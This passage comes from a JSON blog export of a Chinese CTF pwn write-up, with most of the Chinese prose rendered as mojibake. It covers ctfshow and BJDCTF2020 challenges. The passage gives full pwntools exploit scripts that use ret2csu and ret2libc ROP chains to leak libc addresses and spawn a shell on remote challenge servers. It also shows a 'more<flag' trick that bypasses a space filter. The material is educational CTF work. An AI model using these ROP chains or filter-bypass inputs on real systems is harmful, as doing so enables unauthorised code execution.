·çš„ã€‚æˆ‘ä»¬åˆ©ç”¨è¿™ä¸¤ä¸ªgadgetsæ¥ç»„è£…writeå‡½æ•°ï¼Œæ³„éœ²æˆ‘ä»¬æƒ³æ³„éœ²å‡½æ•°çš„gotè¡¨ä¸­åœ°å€</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xa8</span>+p64(gadget1)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(got_write)+p64(<span class=\"number\">8</span>)+p64(got_write)+p64(<span class=\"number\">1</span>)+p64(gadget2)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">56</span>+ p64(start)</span><br></pre></td></tr></table></figure>\n\n<p>ä¹‹ååˆ©ç”¨æ³„éœ²çš„åœ°å€è®¡ç®—systemå‡½æ•°ä»¥åŠbin/shåœ°å€</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>æœ€åç»„è£…payload2æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œsystem(â€œbin/shâ€)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./ret2libc_64&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28177</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;ret2libc_64&#x27;</span>)</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">start = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]  </span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006c3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x004004a9</span></span><br><span class=\"line\">gadget1 = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\">gadget2 = <span class=\"number\">0x04006A0</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xa8</span>+p64(gadget1)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(got_write)+p64(<span class=\"number\">8</span>)+p64(got_write)+p64(<span class=\"number\">1</span>)+p64(gadget2)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">56</span>+ p64(start)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;now,Try Pwn Me?\\n&#x27;</span>,payload1)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;now,Try Pwn Me?\\n&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"36Dæ¯-ç­¾åˆ°\"><a href=\"#36Dæ¯-ç­¾åˆ°\" class=\"headerlink\" title=\"36Dæ¯-ç­¾åˆ°\"></a>36Dæ¯-ç­¾åˆ°</h1><p>ç­¾åˆ°é¢˜ç›´æ¥ncä¸Šå»ä»¥åå‘ç°è€ƒå¯Ÿçš„æ˜¯linuxçš„åŸºæœ¬æ“ä½œï¼Œç¨‹åºè¿‡æ»¤æ‰äº†ç©ºæ ¼ï¼Œcatï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥lsæŸ¥çœ‹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more&lt;flag               è¿™é‡Œ&lt;å¯ä»¥ç»•è¿‡ç©ºæ ¼</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"BJDCTF2020-babyrouter\"><a href=\"#BJDCTF2020-babyrouter\" class=\"headerlink\" title=\"BJDCTF2020-babyrouter\"></a>BJDCTF2020-babyrouter</h1><p>ä¸çŸ¥é“æ˜¯è¿œç«¯æœ‰é—®é¢˜è¿˜æ˜¯libcåº“ä¸å…¨ï¼Œæœ¬åœ°æ‰“é€šäº†ä½†æ˜¯è¿œç«¯æ²¡æœ‰æ‰“é€šï¼Œåæ­£æ€è·¯åœ¨è¿™é‡Œ</p>\n<p>å¾ˆæ˜æ˜¾çš„ä¸€é“libcæ³„éœ²é¢˜ç›®ï¼Œbufçš„åç§»æ˜¯0x20</p>\n<p><img src=\"https://i.loli.net/2021/10/28/ZzYUNXD4uvWScVy.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-28 193359.png\"></p>\n<p>å¯»æ‰¾gadgets</p>\n\n\n<p>æ„é€ payload1ï¼Œpayload2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./babyrouter&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28044</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./babyrouter&#x27;</span>)</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">start_addr=elf.symbols[<span class=\"string\">&quot;_start&quot;</span>]</span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x000400733</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4004c9</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">puts_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#system_addr = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = libcbase + libc.search(&#x27;/bin/sh\\0&#x27;).next()</span></span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","text":"pwn03å°†é™„ä»¶æ‹–è¿›IDAä¸­å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ä»¥åŠsystemå‡½æ•°ï¼Œä¹Ÿä¸èƒ½åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ æ‰€ä»¥å‡½æ•°åœ°å€æ³„éœ²è·å¾—libcç‰ˆæœ¬æ¥è·å¾—systemå‡½æ•°åœ°å€ä»è€Œè·å¾—shellã€‚å…·ä½“æ­¥éª¤ï¼š æ³„éœ² putsåœ°å€ è·å– libc ç‰ˆæœ¬ è·å– system åœ°å€ä¸ /bin/s...","link":"","photos":[],"count_time":{"symbolsCount":"9.6k","symbolsTime":"9 mins."},"categories":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","count":6,"path":"api/categories/åˆ·é¢˜.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn03\"><span class=\"toc-text\">pwn03</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#exp\"><span class=\"toc-text\">exp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn04\"><span class=\"toc-text\">pwn04</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn07\"><span class=\"toc-text\">pwn07</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn10\"><span class=\"toc-text\">pwn10</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%90%8C%E6%96%B0%E8%B5%9B-%E7%AD%BE%E5%88%B0%E9%A2%98\"><span class=\"toc-text\">èŒæ–°èµ›-ç­¾åˆ°é¢˜</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B5%9B-%E7%AD%BE%E5%88%B0%E9%A2%98\"><span class=\"toc-text\">å†…éƒ¨èµ›-ç­¾åˆ°é¢˜</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#36D%E6%9D%AF-%E7%AD%BE%E5%88%B0\"><span class=\"toc-text\">36Dæ¯-ç­¾åˆ°</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#BJDCTF2020-babyrouter\"><span class=\"toc-text\">BJDCTF2020-babyrouter</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T23:24:05.390Z","comments":true,"path":"api/articles/è¥¿æ¹–è®ºå‰‘pwnå¤ç°.json","keywords":null,"cover":"https://i.loli.net/2021/11/23/3mXuv9PTqLHU726.jpg","text":" ç¬¬ä¸€æ¬¡å‚åŠ è¥¿æ¹–è®ºå‰‘ï¼ŒæŠ€æœ¯ä¸å¤Ÿï¼Œä¸€é¢˜æ²¡å‡ºï¼Œå¸Œæœ›æ˜å¹´èƒ½å¤Ÿå‡ºä¸ªä¸¤ä¸‰é“ blindå¬darryğŸ‘´è¯´è¿œç«¯çš„libcè¢«é­”æ”¹äº†ï¼Œå¯¹ä¸ä¸Šï¼ŒåŠ ä¸Šæ²¡æœ‰è¿œç«¯ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘å°±è®²ä¸€ä¸‹æœ¬åœ°å¦‚ä½•æ‰“é€šçš„ã€‚ï¼ˆå…¨ç¨‹darryğŸ‘´è®²è§£ï¼‰ æˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨æ„é€ readå‡½æ•°è®©å‡½æ•°è·³è½¬æ‰§è¡Œshellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ctfshow-misc","uid":"050531b15fb9d2cd0cab573b50dcfcd8","slug":"ctfshow-misc","date":"2021-10-16T14:43:36.000Z","updated":"2021-11-06T02:17:54.027Z","comments":true,"path":"api/articles/ctfshow-misc.json","keywords":null,"cover":"https://i.loli.net/2021/10/13/nMZwPpxO8NWJRi4.jpg","text":"misc1ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€å°±æœ‰flag misc2æ‰“å¼€txtæ–‡ä»¶å‡ºç°ä¸€å †ä¹±ç ï¼Œä¸¢è¿›winhexå‘ç°æ˜¯pngï¼Œç›´æ¥æ”¹åç¼€åå³å¯ misc3bpgæ–‡ä»¶ä½¿ç”¨bpgviewå·¥å…·æ‰“å¼€ï¼Œæ‰“å¼€åå³å¯è·å¾—flag ","link":"","photos":[],"count_time":{"symbolsCount":98,"symbolsTime":"1 mins."},"categories":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","count":6,"path":"api/categories/åˆ·é¢˜.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}